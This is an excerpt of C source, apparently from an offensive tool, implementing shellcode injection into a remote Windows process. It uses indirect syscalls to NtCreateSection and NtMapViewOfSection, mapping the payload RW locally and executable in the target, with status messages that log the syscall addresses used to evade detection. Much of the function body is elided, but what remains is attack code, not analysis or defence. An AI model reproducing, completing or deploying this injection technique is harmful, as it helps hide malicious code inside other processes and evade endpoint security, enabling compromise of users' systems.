...
BOOL Inject(IN PNTAPI_FUNC pNt, IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSize) {
	...
	SET_SYSCALL(pNt->NtCreateSection);
	...
	OKAY("[ 0x%p ] [RWX] Created section.\n    [>] Syscall executed from 0x%p.", hSection, pNt->NtCreateSection.pSyscallInstAddress);

	// Map view of payload into local process address space
	// https://ntdoc.m417z.com/ntmapviewofsection
	SET_SYSCALL(pNt->NtMapViewOfSection);
	...
	OKAY("[ 0x%p ] [RW-] Mapped %d bytes into local process address space.\n    [>] Syscall executed from 0x%p.", pLocalAddress, sViewSize, pNt->NtMapViewOfSection.pSyscallInstAddress);
	...
	OKAY("[ 0x%p ] [--X] Mapped payload into target process address space.\n    [>] Syscall executed from 0x%p.", pRemoteAddress, pNt->NtMapViewOfSection.pSyscallInstAddress);
...
CLEANUP:
	...
	if (pLocalAddress) {
		SET_SYSCALL(pNt->NtUnmapViewOfSection);
		...
		if (STATUS != STATUS_SUCCESS) {
			...
			OKAY("Unmapped view in local process address space.\n    [>] Syscall executed from 0x%p.", pNt->NtUnmapViewOfSection.pSyscallInstAddress);
		}
	}
